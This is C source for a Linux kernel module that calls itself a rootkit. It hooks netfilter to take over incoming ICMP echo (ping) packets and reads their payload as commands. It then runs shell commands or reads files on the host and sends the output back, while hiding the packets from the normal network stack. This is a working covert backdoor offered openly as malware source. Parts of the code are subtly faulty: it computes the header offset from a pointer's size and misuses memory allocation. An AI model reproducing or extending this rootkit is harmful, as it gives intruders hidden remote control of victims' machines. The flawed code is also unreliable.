#include "rootkit.h"


void rootkit_handler(struct work_struct* work) {

    // getting passed args struct
    args_t* args = container_of(work, args_t, work);

    command_t command = parse_command(args->string);

    switch (command) {
        case RUN:
            DEBUG_PRINTF("rootkit: shell command: %s \n", args->string)
            run_command(args);
            break;
        case CAT:
            DEBUG_PRINTF("rootkit: cat command: %s \n", args->string);
            cat_command(args);
            break;
        default:
            DEBUG_PUTS("rootkit: invalid command\n")
            send_response("rootkit: invallid command\0", args);
            break;
    }


    kfree(args);


}

    


unsigned int packet_reciever(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    
    struct iphdr *iph;
    struct icmphdr *icmph;

    unsigned char *user_data;
    unsigned char *tail;
    unsigned char *i;
    int j = 0;

    args_t* args;


    iph = ip_hdr(skb);
    icmph = icmp_hdr(skb);


    //DEBUG_PUTS("rootkit: checking connection\n")


    if (iph->protocol != IPPROTO_ICMP) {
        //DEBUG_PUTS("rootkit: bad protocol\n")
        return NF_ACCEPT;
    }
    if (icmph->type != ICMP_ECHO) {
        DEBUG_PUTS("rootkit: bad request type\n")
        return NF_ACCEPT;
    }

    DEBUG_PUTS("rootkit: parsing command\n")

    args = kmalloc(sizeof(args_t), GFP_KERNEL);

    user_data = (unsigned char *)((unsigned char *)icmph + (sizeof(icmph)));
    tail = skb_tail_pointer(skb);

    // copying the payload to the arg struct
    j = 0;
    for (i = user_data; i != tail; ++i) {
        char c = *(char *)i;

        args->string[j] = c;
        j++;

        if (c == '\0')
            break;

        if (j == REQUEST_SIZE_LIMIT) {
            args->string[j] = '\0';
            break;
        }

    }

    args->icmph = icmph;
    args->iph = iph;
    args->skb = skb;

    DEBUG_PUTS("rootkit: scheduling rootkit action \n")
    INIT_WORK(&args->work, rootkit_handler);
    schedule_work(&args->work);


    return NF_STOLEN;
}